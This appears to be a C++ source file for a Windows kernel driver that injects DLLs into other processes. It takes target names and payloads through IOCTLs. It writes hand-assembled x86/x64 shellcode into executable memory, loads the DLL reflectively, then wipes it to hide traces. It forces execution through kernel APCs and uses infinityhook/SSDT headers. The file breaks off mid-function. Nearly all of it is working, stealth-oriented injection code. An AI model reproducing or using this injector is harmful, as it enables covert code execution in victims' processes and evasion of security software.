#include "undocumented.h"
#include "ssdt.h"
#include "ntdll.h"
#include "MemLoadDll.h"
#include "infinityhook.h"

#if 0
#include <ntstatus.h>
#endif

static UNICODE_STRING DeviceName;
static UNICODE_STRING Win32Device;

#define TAG_INJECTLIST	'ljni'
#define TAG_INJECTDATA	'djni'

#define IOCTL_SET_INJECT_X86DLL \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_IN_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_SET_INJECT_X64DLL \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_IN_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_SET_INJECT_PROCESSNAME \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_IN_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_INJECT_PID \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x903, METHOD_IN_DIRECT, FILE_ANY_ACCESS)

unsigned int g_dwNtQueryVirtualMemoryIndex = 0;

using NtQueryVirtualMemoryTpye = decltype(&ZwQueryVirtualMemory);

NtQueryVirtualMemoryTpye g_pfnOrgNtQueryVirtualMemory = NULL;

#define BB_POOL_TAG 'xxxx'

//
//引入函数
//
extern "C"
NTKERNELAPI
PVOID NTAPI PsGetProcessWow64Process(PEPROCESS process);

extern "C"
NTKERNELAPI
NTSTATUS NTAPI PsLookupProcessByProcessId(
	_In_ HANDLE ProcessId,
	_Outptr_ PEPROCESS *Process
);

extern "C"
NTKERNELAPI
UCHAR* NTAPI PsGetProcessImageFileName(PEPROCESS process);

extern "C" 
NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
);

extern "C" 
NTKERNELAPI
PVOID
NTAPI
PsGetThreadTeb(IN PETHREAD Thread);


extern "C"
NTKERNELAPI
NTSTATUS 
NTAPI
PsSetContextThread(__in PETHREAD 	Thread,
    __in PCONTEXT 	ThreadContext,
    __in KPROCESSOR_MODE 	PreviousMode
);

extern "C"
NTKERNELAPI 
NTSTATUS 
NTAPI 
PsGetContextThread(__in PETHREAD 	Thread,
    __inout PCONTEXT 	ThreadContext,
    __in KPROCESSOR_MODE 	PreviousMode
);

extern "C"
NTKERNELAPI
BOOLEAN
NTAPI
KeTestAlertThread(IN KPROCESSOR_MODE AlertMode);

extern "C"
NTKERNELAPI
BOOLEAN
NTAPI
PsIsProtectedProcess(IN PEPROCESS Process);

extern "C"
NTKERNELAPI
PVOID
NTAPI
PsGetCurrentProcessWow64Process();

typedef VOID(NTAPI *PKNORMAL_ROUTINE)(
    PVOID NormalContext,
    PVOID SystemArgument1,
    PVOID SystemArgument2
    );

typedef VOID(NTAPI* PKKERNEL_ROUTINE)(
    PRKAPC Apc,
    PKNORMAL_ROUTINE *NormalRoutine,
    PVOID *NormalContext,
    PVOID *SystemArgument1,
    PVOID *SystemArgument2
    );

typedef VOID(NTAPI *PKRUNDOWN_ROUTINE)(PRKAPC Apc);

typedef enum _KAPC_ENVIRONMENT
{
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT, *PKAPC_ENVIRONMENT;

extern "C"
NTKERNELAPI
VOID
NTAPI
KeInitializeApc(
    IN PKAPC Apc,
    IN PKTHREAD Thread,
    IN KAPC_ENVIRONMENT ApcStateIndex,
    IN PKKERNEL_ROUTINE KernelRoutine,
    IN PKRUNDOWN_ROUTINE RundownRoutine,
    IN PKNORMAL_ROUTINE NormalRoutine,
    IN KPROCESSOR_MODE ApcMode,
    IN PVOID NormalContext
);

extern "C"
NTKERNELAPI
BOOLEAN
NTAPI
KeInsertQueueApc(
    PKAPC Apc,
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    KPRIORITY Increment
);

//
//注入列表结构体
//
typedef NTSTATUS(NTAPI* fn_NtAllocateVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID *BaseAddress,
	_In_ ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
	);
typedef NTSTATUS(NTAPI* fn_NtReadVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_Out_ PVOID Buffer,
	_In_ SIZE_T BufferSize,
	_Out_opt_ PSIZE_T NumberOfBytesRead
	);
typedef NTSTATUS(NTAPI* fn_NtWriteVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_In_ CONST VOID *Buffer,
	_In_ SIZE_T BufferSize,
	_Out_opt_ PSIZE_T NumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* fn_NtProtectVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID *BaseAddress,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG NewProtect,
	_Out_ PULONG OldProtect
	);

typedef NTSTATUS(NTAPI* fn_NtCreateThreadEx)
(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );

typedef NTSTATUS(NTAPI* PsSuspendThreadType)
(IN PETHREAD Thread,
    OUT PULONG PreviousSuspendCount OPTIONAL);

typedef NTSTATUS(NTAPI* PsResumeThreadType)
(PETHREAD Thread,
    OUT PULONG PreviousCount);


typedef struct _INJECT_PROCESSID_LIST {			//注入列表信息
	LIST_ENTRY	link;
	HANDLE pid;
	BOOLEAN	inject;
    PVOID hookDataPoint;
    SIZE_T hookDataSize;
}INJECT_PROCESSID_LIST, *PINJECT_PROCESSID_LIST;

typedef struct _INJECT_PROCESSID_DATA {			//注入进程数据信息
	HANDLE	pid;
	PVOID	imagebase;
	SIZE_T	imagesize;
    PVOID hookDataPoint;
    SIZE_T  hookDataSize;
}INJECT_PROCESSID_DATA, *PINJECT_PROCESSID_DATA;

typedef struct _INJECT_PROCESSID_DLL {			//内存加载DLL信息
	PVOID	x64dll;
	ULONG	x64dllsize;
	PVOID	x86dll;
	ULONG	x86dllsize;
    CHAR    szProcessName[15];
}INJECT_PROCESSID_DLL, *PINJECT_PROCESSID_DLL;

#pragma pack(push,1)

//
//x86 payload
//
typedef struct _INJECT_PROCESSID_PAYLOAD_X86 {
	UCHAR	saveReg[2]; //pushad //pushfd
	UCHAR	restoneHook[17]; // mov esi,5 mov edi,123 mov esi,456 rep movs byte
	UCHAR	invokeMemLoad[10]; // push xxxxxx call xxxxxx
	UCHAR	eraseDll[14]; // mov al,0 mov ecx,len mov edi,addr rep stos
	UCHAR	restoneReg[2];//popfd popad
	UCHAR	jmpOld[5]; //jmp

	UCHAR	oldData[5];

	UCHAR	dll[1];
	UCHAR	shellcode[1];

}INJECT_PROCESSID_PAYLOAD_X86, *PINJECT_PROCESSID_PAYLOAD_X86;

//
// x64 payload
//
typedef struct _INJECT_PROCESSID_PAYLOAD_X64 {
	UCHAR	saveReg[25];
	UCHAR	subStack[4];
	UCHAR	restoneHook[32]; // mov rcx,xxxx mov rdi,xxxx mov rsi,xxx rep movs byte
	UCHAR	invokeMemLoad[15]; // mov rcx,xxxxx call xxxx
	UCHAR	eraseDll[24]; // mov rdi,xxxx xor eax,eax mov rcx,xxxxx rep stosb
	UCHAR	addStack[4];
	UCHAR	restoneReg[27];
	UCHAR	jmpOld[14]; //jmp qword [0]

	UCHAR	oldData[14];//

	UCHAR	dll[1];
	UCHAR	shellcode[1];

}INJECT_PROCESSID_PAYLOAD_X64, *PINJECT_PROCESSID_PAYLOAD_X64;

//
// x64 payload(thread inject after)
//
typedef struct _INJECT_PROCESSID_PAYLOAD_X64_THREAD {
    UCHAR	invokeMemLoad[15]; // mov rcx,xxxxx call xxxx
    UCHAR	eraseDll[24]; // mov rdi,xxxx xor eax,eax mov rcx,xxxxx rep stosb
    UCHAR   dll[1];
    UCHAR   shellcode[1];
}INJECT_PROCESSID_PAYLOAD_X64_THREAD, *PINJECT_PROCESSID_PAYLOAD_X64_THREAD;

#pragma pack(pop)

//
//全局进程链表
//
INJECT_PROCESSID_LIST	g_injectList;
INJECT_PROCESSID_DLL	g_injectDll;
ERESOURCE			g_ResourceMutex;
NPAGED_LOOKASIDE_LIST g_injectListLookaside;
NPAGED_LOOKASIDE_LIST g_injectDataLookaside;

fn_NtAllocateVirtualMemory	pfn_NtAllocateVirtualMemory;
fn_NtReadVirtualMemory		pfn_NtReadVirtualMemory;
fn_NtWriteVirtualMemory		pfn_NtWriteVirtualMemory;
fn_NtProtectVirtualMemory	pfn_NtProtectVirtualMemory;

BOOLEAN QueryInjectListStatus(HANDLE	processid)
{
	BOOLEAN result = TRUE;

	KeEnterCriticalRegion();
	ExAcquireResourceSharedLite(&g_ResourceMutex, TRUE);

	PLIST_ENTRY	head = &g_injectList.link;
	PINJECT_PROCESSID_LIST next = (PINJECT_PROCESSID_LIST)g_injectList.link.Blink;

	while (head != (PLIST_ENTRY)next)
	{
		if (next->pid == processid)
		{
			if (next->inject == FALSE)
			{
				result = FALSE;
			}
			
			break;
		}

		next = (PINJECT_PROCESSID_LIST)(next->link.Blink);
	}


	ExReleaseResourceLite(&g_ResourceMutex);
	KeLeaveCriticalRegion();

	return result;
}

BOOLEAN QueryInjectInfo(HANDLE	processid, ULONG_PTR* hookDataPoint, SIZE_T* hookDataSize)
{
    BOOLEAN result = TRUE;

    KeEnterCriticalRegion();
    ExAcquireResourceSharedLite(&g_ResourceMutex, TRUE);

    PLIST_ENTRY	head = &g_injectList.link;
    PINJECT_PROCESSID_LIST next = (PINJECT_PROCESSID_LIST)g_injectList.link.Blink;

    while (head != (PLIST_ENTRY)next)
    {
        if (next->pid == processid)
        {
            if (next->inject == FALSE)
            {
                result = FALSE;
            }

            *hookDataPoint = (ULONG_PTR)next->hookDataPoint;
            *hookDataSize = next->hookDataSize;

            break;
        }

        next = (PINJECT_PROCESSID_LIST)(next->link.Blink);
    }


    ExReleaseResourceLite(&g_ResourceMutex);
    KeLeaveCriticalRegion();

    return result;
}

VOID SetInjectListStatus(HANDLE	processid, PVOID hookDataPoint, SIZE_T hookDataSize)
{
	KeEnterCriticalRegion();
	ExAcquireResourceExclusiveLite(&g_ResourceMutex, TRUE);

	PLIST_ENTRY	head = &g_injectList.link;
	PINJECT_PROCESSID_LIST next = (PINJECT_PROCESSID_LIST)g_injectList.link.Blink;

	while (head != (PLIST_ENTRY)next)
	{
		if (next->pid == processid)
		{
			next->inject = TRUE;
            next->hookDataPoint = hookDataPoint;
            next->hookDataSize = hookDataSize;
			break;
		}

		next = (PINJECT_PROCESSID_LIST)(next->link.Blink);
	}


	ExReleaseResourceLite(&g_ResourceMutex);
	KeLeaveCriticalRegion();

}

VOID AddInjectList(HANDLE processid)
{
	//DPRINT("%s %d\n", __FUNCTION__, processid);

	KeEnterCriticalRegion();
	ExAcquireResourceExclusiveLite(&g_ResourceMutex, TRUE);

	PINJECT_PROCESSID_LIST newLink = (PINJECT_PROCESSID_LIST)\
		ExAllocateFromNPagedLookasideList(&g_injectListLookaside);

	if (newLink == NULL)
	{
		ASSERT(false);
	}
	newLink->pid = processid;
	newLink->inject = false;

	InsertTailList(&g_injectList.link, (PLIST_ENTRY)newLink);

	ExReleaseResourceLite(&g_ResourceMutex);
	KeLeaveCriticalRegion();
}

VOID DeleteInjectList(HANDLE processid)
{
	//DPRINT("%s %d\n", __FUNCTION__, processid);

	KeEnterCriticalRegion();
	ExAcquireResourceExclusiveLite(&g_ResourceMutex, TRUE);

	PLIST_ENTRY	head = &g_injectList.link;
	PINJECT_PROCESSID_LIST next = (PINJECT_PROCESSID_LIST)g_injectList.link.Blink;

	while (head != (PLIST_ENTRY)next)
	{
		if (next->pid == processid)
		{
			RemoveEntryList(&next->link);
			ExFreeToNPagedLookasideList(&g_injectListLookaside, &next->link);
			break;
		}

		next = (PINJECT_PROCESSID_LIST)(next->link.Blink);
	}


	ExReleaseResourceLite(&g_ResourceMutex);
	KeLeaveCriticalRegion();
}

BOOLEAN BBSkipThread(IN PETHREAD pThread, IN BOOLEAN isWow64)
{
    PUCHAR pTeb64 = (PUCHAR)PsGetThreadTeb(pThread);
    if (!pTeb64)
        return TRUE;

    // Skip GUI treads. APC to GUI thread causes ZwUserGetMessage to fail
    // TEB64 + 0x78  = Win32ThreadInfo
    if (*(PULONG64)(pTeb64 + 0x78) != 0)
        return TRUE;

    // Skip threads with no ActivationContext
    // Skip threads with no TLS pointer
    if (isWow64)
    {
        PUCHAR pTeb32 = pTeb64 + 0x2000;

        // TEB32 + 0x1A8 = ActivationContextStackPointer
        if (*(PULONG32)(pTeb32 + 0x1A8) == 0)
            return TRUE;

        //// TEB64 + 0x2C = ThreadLocalStoragePointer
        if (*(PULONG32)(pTeb32 + 0x2C) == 0)
            return TRUE;
    }
    else
    {
        // TEB64 + 0x2C8 = ActivationContextStackPointer
        if (*(PULONG64)(pTeb64 + 0x2C8) == 0)
            return TRUE;

        //// TEB64 + 0x58 = ThreadLocalStoragePointer
        if (*(PULONG64)(pTeb64 + 0x58) == 0)
            return TRUE;
    }

    return FALSE;
}

NTSTATUS BBLookupProcessThread(IN PEPROCESS pProcess, OUT PETHREAD* ppThread)
{
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE pid = PsGetProcessId(pProcess);
    PVOID pBuf = ExAllocatePoolWithTag(NonPagedPool, 1024 * 1024, 'xxxx');
    PSYSTEM_PROCESS_INFO pInfo = (PSYSTEM_PROCESS_INFO)pBuf;

    ASSERT(ppThread != NULL);
    if (ppThread == NULL)
        return STATUS_INVALID_PARAMETER;

    if (!pInfo)
    {
        DPRINT("BlackBone: %s: Failed to allocate memory for process list\n", __FUNCTION__);
        return STATUS_NO_MEMORY;
    }

    // Get the process thread list
    status = ZwQuerySystemInformation(SystemProcessInformation, pInfo, 1024 * 1024, NULL);
    if (!NT_SUCCESS(status))
    {
        ExFreePoolWithTag(pBuf, 'xxxx');
        return status;
    }

    // Find target thread
    if (NT_SUCCESS(status))
    {
        status = STATUS_NOT_FOUND;
        for (;;)
        {
            if (pInfo->UniqueProcessId == pid)
            {
                status = STATUS_SUCCESS;
                break;
            }
            else if (pInfo->NextEntryOffset)
                pInfo = (PSYSTEM_PROCESS_INFO)((PUCHAR)pInfo + pInfo->NextEntryOffset);
            else
                break;
        }
    }

    BOOLEAN wow64 = PsGetProcessWow64Process(pProcess) != NULL;

    // Reference target thread
    if (NT_SUCCESS(status))
    {
        status = STATUS_NOT_FOUND;

        // Get first thread
        for (ULONG i = 0; i < pInfo->NumberOfThreads; i++)
        {
            // Skip current thread
            if (/*pInfo->Threads[i].WaitReason == Suspended ||
                 pInfo->Threads[i].ThreadState == 5 ||*/
                pInfo->Threads[i].ClientId.UniqueThread == PsGetCurrentThreadId())
            {
                continue;
            }

            status = PsLookupThreadByThreadId(pInfo->Threads[i].ClientId.UniqueThread, ppThread);

            // Skip specific threads
            if (*ppThread && BBSkipThread(*ppThread, wow64))
            {
                ObDereferenceObject(*ppThread);
                *ppThread = NULL;
                continue;
            }

            break;
        }
    }
    else
        DPRINT("BlackBone: %s: Failed to locate process\n", __FUNCTION__);

    if (pBuf)
        ExFreePoolWithTag(pBuf, 'xxxx');

    // No suitable thread
    if (!*ppThread)
        status = STATUS_NOT_FOUND;

    return status;
}

//
// Injection APC routines
//
VOID KernelApcPrepareCallback(
    PKAPC Apc,
    PKNORMAL_ROUTINE* NormalRoutine,
    PVOID* NormalContext,
    PVOID* SystemArgument1,
    PVOID* SystemArgument2
)
{
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(NormalContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    //DPRINT( "BlackBone: %s: Called\n", __FUNCTION__ );

    // Alert current thread
    KeTestAlertThread(UserMode);
    ExFreePoolWithTag(Apc, BB_POOL_TAG);
}

VOID KernelApcInjectCallback(
    PKAPC Apc,
    PKNORMAL_ROUTINE* NormalRoutine,
    PVOID* NormalContext,
    PVOID* SystemArgument1,
    PVOID* SystemArgument2
)
{
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    // Skip execution
    if (PsIsThreadTerminating(PsGetCurrentThread()))
        *NormalRoutine = NULL;

    // Fix Wow64 APC
    if (PsGetCurrentProcessWow64Process() != NULL)
        PsWrapApcWow64Thread(NormalContext, (PVOID*)NormalRoutine);

    ExFreePoolWithTag(Apc, BB_POOL_TAG);
}

NTSTATUS BBQueueUserApc(
    IN PETHREAD pThread,
    IN PVOID pUserFunc,
    IN PVOID Arg1,
    IN PVOID Arg2,
    IN PVOID Arg3,
    IN BOOLEAN bForce
)
{
    ASSERT(pThread != NULL);
    if (pThread == NULL)
        return STATUS_INVALID_PARAMETER;

    // Allocate APC
    PKAPC pPrepareApc = NULL;
    PKAPC pInjectApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), BB_POOL_TAG);

    if (pInjectApc == NULL)
    {
        DPRINT("BlackBone: %s: Failed to allocate APC\n", __FUNCTION__);
        return STATUS_NO_MEMORY;
    }

    // Actual APC
    KeInitializeApc(
        pInjectApc, (PKTHREAD)pThread,
        OriginalApcEnvironment, &KernelApcInjectCallback,
        NULL, (PKNORMAL_ROUTINE)(ULONG_PTR)pUserFunc, UserMode, Arg1
    );

    // Setup force-delivery APC
    if (bForce)
    {
        pPrepareApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), BB_POOL_TAG);
        KeInitializeApc(
            pPrepareApc, (PKTHREAD)pThread,
            OriginalApcEnvironment, &KernelApcPrepareCallback,
            NULL, NULL, KernelMode, NULL
        );
    }

    // Insert APC
    if (KeInsertQueueApc(pInjectApc, Arg2, Arg3, 0))
    {
        if (bForce && pPrepareApc)
            KeInsertQueueApc(pPrepareApc, NULL, NULL, 0);

        return STATUS_SUCCESS;
    }
    else
    {
        DPRINT("BlackBone: %s: Failed to insert APC\n", __FUNCTION__);

        ExFreePoolWithTag(pInjectApc, BB_POOL_TAG);

        if (pPrepareApc)
            ExFreePoolWithTag(pPrepareApc, BB_POOL_TAG);

        return STATUS_NOT_CAPABLE;
    }
}

BOOLEAN BBCheckProcessTermination(PEPROCESS pProcess)
{
    LARGE_INTEGER zeroTime = { 0 };
    return KeWaitForSingleObject(pProcess, Executive, KernelMode, FALSE, &zeroTime) == STATUS_WAIT_0;
}

NTSTATUS Inject64ByApc(HANDLE pid)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PEPROCESS Process = NULL;
    PETHREAD Thread = NULL;

    BOOLEAN bIsAttacked = FALSE;
    KAPC_STATE apc;

    PVOID alloc_ptr = NULL;
    SIZE_T alloc_size = 0;

    ULONG64			dllPos, shellcodePos;
    ULONG64	dwTmpBuf;
    ULONG	dwTmpBuf2;
    INJECT_PROCESSID_PAYLOAD_X64	payload = { 0 };

    do
    {
        if (pid <= (HANDLE)4)
            break;

        /*ULONG_PTR ptr = 0;
        ULONG_PTR ptrsize = 0;

        QueryInjectInfo(pid, &ptr, &ptrsize);

        if (ptrsize != 0)
        {
            status = STATUS_OBJECTID_EXISTS;
            break;
        }*/

        status = PsLookupProcessByProcessId(pid, &Process);

        if (!NT_SUCCESS(status))
            break;

        KeStackAttachProcess(Process, &apc);

        bIsAttacked = true;

        status = BBLookupProcessThread(Process, &Thread);

        if (!NT_SUCCESS(status))
        {
            DPRINT("No Find Inject Thread.\n");
            
            break;
        }

        alloc_size = sizeof(INJECT_PROCESSID_PAYLOAD_X64) + sizeof(MemLoadShellcode_x64) + g_injectDll.x64dllsize;

        status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &alloc_ptr, 0, &alloc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(status))
            break;

        UCHAR saveReg[] = "\x50\x51\x52\x53\x6A\xFF\x55\x56\x57\x41\x50\x41\x51\x6A\x10\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57";
        UCHAR restoneReg[] = "\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5F\x5E\x5D\x48\x83\xC4\x08\x5B\x5A\x59\x58";

        memcpy(payload.saveReg, saveReg, sizeof(saveReg));
        memcpy(payload.restoneReg, restoneReg, sizeof(restoneReg));

        payload.subStack[0] = 0x48;
        payload.subStack[1] = 0x83;
        payload.subStack[2] = 0xec;
        payload.subStack[3] = 0x28;

        payload.addStack[0] = 0x48;
        payload.addStack[1] = 0x83;
        payload.addStack[2] = 0xc4;
        payload.addStack[3] = 0x28;

        payload.restoneHook[0] = 0x48;
        payload.restoneHook[1] = 0xb9; // mov rcx,len
        payload.restoneHook[10] = 0x48;
        payload.restoneHook[11] = 0xBF; //mov rdi,xxxx
        payload.restoneHook[20] = 0x48;
        payload.restoneHook[21] = 0xBe; //mov rsi,xxxx
        payload.restoneHook[30] = 0xF3;
        payload.restoneHook[31] = 0xA4; //REP MOVSB

        //RtlFillMemory(payload.restoneHook, sizeof(payload.restoneHook), 0x90);

        payload.invokeMemLoad[0] = 0x48;
        payload.invokeMemLoad[1] = 0xb9;  // mov rcx,xxxxxx
        payload.invokeMemLoad[10] = 0xE8; // call xxxxx

        payload.eraseDll[0] = 0x48;
        payload.eraseDll[1] = 0xbf; // mov rdi,addr
        payload.eraseDll[10] = 0x31;
        payload.eraseDll[11] = 0xC0; //xor eax,eax
        payload.eraseDll[12] = 0x48;
        payload.eraseDll[13] = 0xB9; //mov rcx,xxxxx
        payload.eraseDll[22] = 0xF3;
        payload.eraseDll[23] = 0xAA;

        payload.jmpOld[0] = 0xc3;// return
        payload.jmpOld[1] = 0x90;

        dllPos = ULONG64(alloc_ptr) + (sizeof(INJECT_PROCESSID_PAYLOAD_X64) - 2);
        shellcodePos = dllPos + g_injectDll.x64dllsize;


        // complete check
        dwTmpBuf = 1;//sizeof(payload.oldData);
        payload.oldData[0] = 0x90;
        payload.oldData[1] = 0;
        memcpy(&payload.restoneHook[2], &dwTmpBuf, sizeof(ULONG64));
        dwTmpBuf = (ULONG64)alloc_ptr + (sizeof(INJECT_PROCESSID_PAYLOAD_X64) - 16);
        ULONG64 completePos = dwTmpBuf + 1;
        memcpy(&payload.restoneHook[12], &completePos, sizeof(ULONG64));
        memcpy(&payload.restoneHook[22], &dwTmpBuf, sizeof(ULONG64));

        //调用内存加载
        memcpy(&payload.invokeMemLoad[2], &dllPos, sizeof(ULONG64));
        dwTmpBuf2 = (ULONG)(shellcodePos - ((ULONG64)alloc_ptr + 0x47) - 5);
        memcpy(&payload.invokeMemLoad[11], &dwTmpBuf2, sizeof(ULONG));


        //擦除DLL
        dwTmpBuf = sizeof(MemLoadShellcode_x64) + g_injectDll.x64dllsize;
        memcpy(&payload.eraseDll[2], &dllPos, sizeof(ULONG64));
        memcpy(&payload.eraseDll[14], &dwTmpBuf, sizeof(ULONG64));

        RtlCopyMemory(alloc_ptr, &payload, sizeof(payload));

        RtlCopyMemory((PVOID)dllPos, g_injectDll.x64dll, g_injectDll.x64dllsize);

        RtlCopyMemory((PVOID)shellcodePos, MemLoadShellcode_x64, sizeof(MemLoadShellcode_x64));

        status = BBQueueUserApc(Thread, alloc_ptr, NULL, NULL, NULL, TRUE);

        if (!NT_SUCCESS(status))
            break;

        LARGE_INTEGER interval = { 0 };
        interval.QuadPart = -(5LL * 10 * 1000);

        for (ULONG i = 0; i < 10000; i++)
        {
            if (BBCheckProcessTermination(PsGetCurrentProcess()) || PsIsThreadTerminating(Thread))
            {
                status = STATUS_PROCESS_IS_TERMINATING;
                break;
            }

            // comple check
            if (*(PUCHAR)completePos == 0x90)
            {
                AddInjectList(pid);
                SetInjectListStatus(pid, alloc_ptr, alloc_size);
                break;
            }

            if (!NT_SUCCESS(status = KeDelayExecutionThread(KernelMode, FALSE, &interval)))
                break;
        }

    } while (false);

    if (!NT_SUCCESS(status) && alloc_ptr)
        ZwFreeVirtualMemory(ZwCurrentProcess(), &alloc_ptr, &alloc_size, MEM_RELEASE);

    if (bIsAttacked)
        KeUnstackDetachProcess(&apc);

    if (Thread)
        ObDereferenceObject(Thread);

    if (Process)
        ObDereferenceObject(Process);

    return status;
}

NTSTATUS Injectx86(HANDLE pid)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PEPROCESS Process = NULL;
    BOOLEAN bAttached = FALSE;
    KAPC_STATE apc;
    PETHREAD Thread = NULL;

    INJECT_PROCESSID_PAYLOAD_X86	payload = { 0 };

    SIZE_T alloc_size = 0;

    PVOID alloc_ptr = NULL;

    ULONG dllPos, shellcodePos;

    ULONG dwTmpBuf = 0;

    do
    {
        if (pid <= (HANDLE)4)
            break;

        status = PsLookupProcessByProcessId(pid, &Process);

        if (!NT_SUCCESS(status))
            break;

        KeStackAttachProcess(Process, &apc);

        bAttached = true;

        status = BBLookupProcessThread(Process, &Thread);

        if (!NT_SUCCESS(status))
        {
            DPRINT("No Find Inject Thread.\n");

            break;
        }

        alloc_size = sizeof(INJECT_PROCESSID_PAYLOAD_X86) + sizeof(MemLoadShellcode_x86) + g_injectDll.x86dllsize;

        payload.saveReg[0] = 0x60; //pushad
        payload.saveReg[1] = 0x9c; //pushfd

        payload.restoneHook[0] = 0xB9;//0xB9; // mov ecx,5
        payload.restoneHook[5] = 0xBE; // mov edi,xxxx
        payload.restoneHook[10] = 0xBF; // mov esi,xxxx
        payload.restoneHook[15] = 0xF3;
        payload.restoneHook[16] = 0xA4; // rep movsb

        payload.invokeMemLoad[0] = 0x68; // push xxxxxx
        payload.invokeMemLoad[5] = 0xE8; // call xxxxxx


        payload.eraseDll[0] = 0xB0;
        payload.eraseDll[2] = 0xB9;
        payload.eraseDll[7] = 0xBF;
        payload.eraseDll[12] = 0xF3;
        payload.eraseDll[13] = 0xAA;

        payload.restoneReg[0] = 0x9D; // popfd
        payload.restoneReg[1] = 0x61; // popad

        payload.jmpOld[0] = 0xc2;// jmp xxxxxx
        payload.jmpOld[1] = 0x04;
        payload.jmpOld[2] = 0x00;

        /*status = pfn_NtAllocateVirtualMemory(NtCurrentProcess(),
            &alloc_ptr,
            NULL,
            &alloc_size,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);*/

        status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &alloc_ptr, 0, &alloc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(status))
            break;


        dllPos = PtrToUlong(alloc_ptr) + sizeof(INJECT_PROCESSID_PAYLOAD_X86) - 2;
        shellcodePos = dllPos + g_injectDll.x86dllsize;

        //恢复hook
        dwTmpBuf = 1;
        payload.oldData[0] = 0x90;
        payload.oldData[1] = 0;
        memcpy(&payload.restoneHook[1], &dwTmpBuf, sizeof(ULONG));
        dwTmpBuf = PtrToUlong(alloc_ptr) + (sizeof(INJECT_PROCESSID_PAYLOAD_X86) - 7);
        ULONG completePos = dwTmpBuf + 1;
        memcpy(&payload.restoneHook[6], &dwTmpBuf, sizeof(ULONG));
        memcpy(&payload.restoneHook[11], &completePos, sizeof(ULONG));

        //调用内存加载
        memcpy(&payload.invokeMemLoad[1], &dllPos, sizeof(ULONG));
        dwTmpBuf = shellcodePos - (PtrToUlong(alloc_ptr) + 24) - 5;
        memcpy(&payload.invokeMemLoad[6], &dwTmpBuf, sizeof(ULONG));


        //擦除DLL
        dwTmpBuf = sizeof(MemLoadShellcode_x86) + g_injectDll.x86dllsize;
        memcpy(&payload.eraseDll[3], &dwTmpBuf, sizeof(ULONG));
        memcpy(&payload.eraseDll[8], &dllPos, sizeof(ULONG));

        RtlCopyMemory(alloc_ptr, &payload, sizeof(payload));

        RtlCopyMemory((PVOID)dllPos, g_injectDll.x86dll, g_injectDll.x86dllsize);

        RtlCopyMemory((PVOID)shellcodePos, MemLoadShellcode_x86, sizeof(MemLoadShellcode_x86));

        status = BBQueueUserApc(Thread, alloc_ptr, NULL, NULL, NULL, TRUE);

        if (!NT_SUCCESS(status))
            break;

        LARGE_INTEGER interval = { 0 };
        interval.QuadPart = -(5LL * 10 * 1000);

        for (ULONG i = 0; i < 10000; i++)
        {
            if (BBCheckProcessTermination(PsGetCurrentProcess()) || PsIsThreadTerminating(Thread))
            {
                status = STATUS_PROCESS_IS_TERMINATING;
                break;
            }

            // comple check
            if (*(PUCHAR)completePos == 0x90)
            {
                AddInjectList(pid);
                SetInjectListStatus(pid, alloc_ptr, alloc_size);
                break;
            }

            if (!NT_SUCCESS(status = KeDelayExecutionThread(KernelMode, FALSE, &interval)))
                break;
        }

    } while (false);

    if (!NT_SUCCESS(status) && alloc_ptr)
        ZwFreeVirtualMemory(ZwCurrentProcess(), &alloc_ptr, &alloc_size, MEM_RELEASE);

    if (bAttached)
        KeUnstackDetachProcess(&apc);

    if (Thread)
        ObDereferenceObject(Thread);

    if (Process)
        ObDereferenceObject(Process);

    return status;
}

NTSTATUS InjectByApc(HANDLE pid)
{
    if (pid <= (HANDLE)4)
        return STATUS_INVALID_PARAMETER;

    PEPROCESS Process = NULL;

    if (!NT_SUCCESS(PsLookupProcessByProcessId(pid, &Process)))
        return STATUS_INVALID_PARAMETER;

    BOOLEAN wow64 = PsGetProcessWow64Process(Process) != NULL;

    ObDereferenceObject(Process);

    if (wow64)
